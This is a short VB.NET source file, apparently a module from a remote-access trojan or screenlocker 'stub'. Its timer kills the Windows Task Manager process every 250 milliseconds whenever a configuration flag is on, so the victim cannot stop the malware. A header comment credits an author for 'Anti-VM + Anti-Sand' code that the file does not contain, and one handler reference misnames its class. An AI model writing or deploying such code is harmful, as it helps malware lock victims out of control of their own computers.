Imports System
Imports System.Diagnostics
Imports System.Timers
Imports Microsoft.VisualBasic.CompilerServices
Imports j

Namespace Stub
    Public Class NoTska

        '########################
        '#  Anti-VM + Anti-Sand #
        '#  Humoud Al-Juraid    #
        '#      @HumoudMJ       #
        '# Please Donot remove  #
        '#	    my credit       #
        '########################

        'Kill Taskmgr Mod 4 Platinum (Screenlocker)

        Public Shared Sub Handler(ByVal sender As Object, ByVal e As ElapsedEventArgs)

            If OK.NTTA = "on" Then


                Dim process As Process
                For Each process In Process.GetProcessesByName("taskmgr")
                    Try
                        process.Kill()
                    Catch ex As Exception
                    End Try
                Next

            Else

            End If


        End Sub

        Public Shared Sub Start()
            NoTska.Timer = New Timer(250)
            AddHandler NoTska.Timer.Elapsed, New ElapsedEventHandler(AddressOf NoTsk.Handler)
            NoTska.Timer.Enabled = True
        End Sub


        ' Fields
        Private Shared Timer As Timer
        '' Private Shared xN As j.OK = New j.OK
    End Class
End Namespace

